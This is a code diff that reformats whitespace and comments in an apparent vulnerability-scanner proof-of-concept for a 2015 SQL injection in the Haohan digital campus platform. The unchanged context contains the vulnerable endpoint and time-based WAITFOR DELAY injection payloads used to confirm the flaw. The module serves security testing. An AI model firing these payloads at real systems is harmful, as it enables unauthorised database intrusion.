@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
+
 class Vuln(ABVuln):
     vuln_id = 'Haohanjy_0001'  # 平台漏洞编号，留空
     name = '皓翰教育通用数字化校园平台 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-07-25'  # 漏洞公布时间
     desc = '''
         浙江皓翰教育科技有限公司通用数字化校园平台存在SQL注入漏洞。
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '皓翰数字化校园平台'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '56767962-9765-46c0-850d-af4304bc5400'
@@ -33,7 +35,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #refer:http://www.wooyun.org/bugs/wooyun-2015-0128557
+            # refer:http://www.wooyun.org/bugs/wooyun-2015-0128557
             hh = hackhttp.hackhttp()
             arg = self.target
             payload = '/IneduPortal/Components/albums/AlbumShow.aspx?id=1'
@@ -44,7 +46,7 @@ class Poc(ABPoc):
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
                 return
-            
+
             getdata1 = '%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--%0A'
             getdata2 = '%3BWAITFOR%20DELAY%20%270%3A0%3A0%27--%0A'
             t1 = time.time()
@@ -62,6 +64,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
